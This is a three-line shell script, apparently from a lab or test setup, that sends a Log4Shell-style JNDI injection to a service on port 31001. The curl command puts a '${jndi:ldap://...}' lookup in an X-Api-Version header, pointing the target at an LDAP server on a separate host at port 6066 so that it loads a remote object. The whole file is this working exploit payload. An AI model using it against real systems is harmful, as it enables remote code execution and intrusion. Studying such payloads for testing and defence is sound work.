MASTER_GATEWAY_IP="192.168.122.1"
curl http://$MASTER_IP:31001 -H "X-Api-Version: \${jndi:ldap://$MASTER_GATEWAY_IP:6066/o=tomcat}"
sleep 1